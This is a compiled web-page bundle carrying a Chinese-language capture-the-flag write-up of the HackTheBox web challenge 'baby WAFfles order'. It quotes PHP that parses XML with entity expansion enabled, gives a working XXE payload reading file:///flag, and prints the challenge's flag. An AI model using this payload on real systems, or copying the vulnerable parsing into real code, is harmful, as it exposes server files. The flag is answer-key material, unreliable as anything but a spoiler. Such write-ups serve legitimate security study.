"use strict";(self.webpackChunktarget_machines_write_up=self.webpackChunktarget_machines_write_up||[]).push([[1007],{73732:(e,n,r)=>{r.r(n),r.d(n,{assets:()=>c,contentTitle:()=>i,default:()=>h,frontMatter:()=>a,metadata:()=>s,toc:()=>d});const s=JSON.parse('{"id":"HackTheBox/Challenges/Web/baby WAFfles order/index","title":"baby WAFfles order","description":"Difficulty: EASY","source":"@site/docs/HackTheBox/Challenges/Web/baby WAFfles order/index.md","sourceDirName":"HackTheBox/Challenges/Web/baby WAFfles order","slug":"/HackTheBox/Challenges/Web/baby WAFfles order/","permalink":"/Target-Machines-WriteUp/docs/HackTheBox/Challenges/Web/baby WAFfles order/","draft":false,"unlisted":false,"editUrl":"https://github.com/TryHackMyOffsecBox/Target-Machines-WriteUp/edit/main/docs/HackTheBox/Challenges/Web/baby WAFfles order/index.md","tags":[],"version":"current","frontMatter":{},"sidebar":"HackTheBox_Sidebar","previous":{"title":"baby BoneChewerCon","permalink":"/Target-Machines-WriteUp/docs/HackTheBox/Challenges/Web/baby BoneChewerCon/"},"next":{"title":"baby auth","permalink":"/Target-Machines-WriteUp/docs/HackTheBox/Challenges/Web/baby auth/"}}');var o=r(74848),t=r(28453);const a={},i="baby WAFfles order",c={},d=[];function l(e){const n={admonition:"admonition",code:"code",h1:"h1",header:"header",img:"img",p:"p",pre:"pre",...(0,t.R)(),...e.components};return(0,o.jsxs)(o.Fragment,{children:[(0,o.jsx)(n.header,{children:(0,o.jsx)(n.h1,{id:"baby-waffles-order",children:"baby WAFfles order"})}),"\n",(0,o.jsxs)(n.admonition,{title:"CHALLENGE DESCRIPTION",type:"note",children:[(0,o.jsx)(n.p,{children:"Difficulty: EASY"}),(0,o.jsx)(n.p,{children:"Our WAFfles and ice scream are out of this world, come to our online WAFfles house and check out our super secure ordering system API!"}),(0,o.jsx)(n.p,{children:"\u6211\u4eec\u7684\u534e\u592b\u997c\u548c\u51b0\u6dc7\u6dcb\u7b80\u76f4\u7f8e\u5473\u5230\u8ba9\u4eba\u65e0\u6cd5\u6297\u62d2\uff0c\u5feb\u6765\u6211\u4eec\u7684\u5728\u7ebf\u534e\u592b\u997c\u5c4b\uff0c\u770b\u770b\u6211\u4eec\u8d85\u7ea7\u5b89\u5168\u7684\u8ba2\u8d2d\u7cfb\u7edfAPI\u5427\uff01"})]}),"\n",(0,o.jsx)(n.p,{children:"\u76f4\u63a5\u8bbf\u95ee"}),"\n",(0,o.jsx)(n.p,{children:(0,o.jsx)(n.img,{alt:"img",src:r(72306).A+"",width:"2560",height:"1371"})}),"\n",(0,o.jsx)(n.p,{children:"\u540c\u65f6\uff0c\u9898\u76ee\u63d0\u4f9b\u4e86\u73af\u5883\u6e90\u7801"}),"\n",(0,o.jsx)(n.p,{children:(0,o.jsx)(n.img,{alt:"img",src:r(46178).A+"",width:"2560",height:"1540"})}),"\n",(0,o.jsxs)(n.p,{children:["\u5728",(0,o.jsx)(n.code,{children:"controllers\\OrderController.php"}),"\u4e2d\uff0c\u770b\u5230"]}),"\n",(0,o.jsx)(n.pre,{children:(0,o.jsx)(n.code,{className:"language-php",children:"<?php\nclass OrderController\n{\n    public function order($router)\n    {\n        $body = file_get_contents('php://input');\n        if ($_SERVER['HTTP_CONTENT_TYPE'] === 'application/json')\n        {\n            $order = json_decode($body);\n            if (!$order->food) \n                return json_encode([\n                    'status' => 'danger',\n                    'message' => 'You need to select a food option first'\n                ]);\n            return json_encode([\n                'status' => 'success',\n                'message' => \"Your {$order->food} order has been submitted successfully.\"\n            ]);\n        }\n        else if ($_SERVER['HTTP_CONTENT_TYPE'] === 'application/xml')\n        {\n            $order = simplexml_load_string($body, 'SimpleXMLElement', LIBXML_NOENT);\n            if (!$order->food) return 'You need to select a food option first';\n            return \"Your {$order->food} order has been submitted successfully.\";\n        }\n        else\n        {\n            return $router->abort(400);\n        }\n    }\n}\n"})}),"\n",(0,o.jsx)(n.p,{children:"\u5f88\u660e\u663e\u5b58\u5728\u6709XXE\u653b\u51fb\u6f0f\u6d1e\uff0c\u5c1d\u8bd5\u8fdb\u884c\u653b\u51fb"}),"\n",(0,o.jsx)(n.p,{children:(0,o.jsx)(n.img,{alt:"img",src:r(31501).A+"",width:"2560",height:"1540"})}),"\n",(0,o.jsx)(n.pre,{children:(0,o.jsx)(n.code,{className:"language-xml",children:'<?xml version="1.0" encoding="UTF-8"?>\n<!DOCTYPE foo [\n    <!ENTITY xxe SYSTEM "file:///flag">\n]>\n<order>\n    <food>&xxe;</food>\n</order>\n'})}),"\n",(0,o.jsx)(n.p,{children:"\u5373\u53ef\u5f97\u5230\u6700\u7ec8\u7684\u7b54\u6848"}),"\n",(0,o.jsx)(n.pre,{children:(0,o.jsx)(n.code,{className:"language-flag",children:"HTB{wh0_l3t_th3_XX3_0ut??w00f..w00f..w00f..WAFfles!}\n"})})]})}function h(e={}){const{wrapper:n}={...(0,t.R)(),...e.components};return n?(0,o.jsx)(n,{...e,children:(0,o.jsx)(l,{...e})}):l(e)}},72306:(e,n,r)=>{r.d(n,{A:()=>s});const s=r.p+"assets/images/image_20250333-223344-7517ed77ba5cc933266af72abe57a156.png"},46178:(e,n,r)=>{r.d(n,{A:()=>s});const s=r.p+"assets/images/image_20250348-224808-9cb3cc911eb84fa9add23f00ff8c80a1.png"},31501:(e,n,r)=>{r.d(n,{A:()=>s});const s=r.p+"assets/images/image_20250354-225445-e23559230ae1833ab0e4a332cb160685.png"},28453:(e,n,r)=>{r.d(n,{R:()=>a,x:()=>i});var s=r(96540);const o={},t=s.createContext(o);function a(e){const n=s.useContext(t);return s.useMemo((function(){return"function"==typeof e?e(n):{...n,...e}}),[n,e])}function i(e){let n;return n=e.disableParentContext?"function"==typeof e.components?e.components(o):e.components||o:a(e.components),s.createElement(t.Provider,{value:n},e.children)}}}]);